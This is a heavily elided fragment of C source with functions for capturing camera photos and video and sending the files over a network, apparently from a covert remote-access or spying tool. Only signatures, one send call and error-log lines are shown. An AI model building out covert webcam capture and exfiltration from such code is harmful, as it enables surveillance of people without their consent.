...
int SendCameraFile(char * szFileName,int cmd)
{
	...
	{
		iRet = IndependentNetWork_SendMessage(lpBuf,dwFileSize,CAMERAPHOTO,szFileName);
	}
...
int __stdcall CameraVideoCapture(unsigned long DelayTime)
{
	...
	try
	{
		...
		iRet = ModifyModuleFileName(strFilePath,strFileName);
	...
	{
		WriteLittleBearLog("CameraVideoCapture exception\r\n");
		return FALSE;
	}
}
...
int __stdcall CameraPhotoCapture()
{
	...
	{
		WriteLittleBearLog("CameraPhotoCapture exception\r\n");
		return FALSE;
	}
}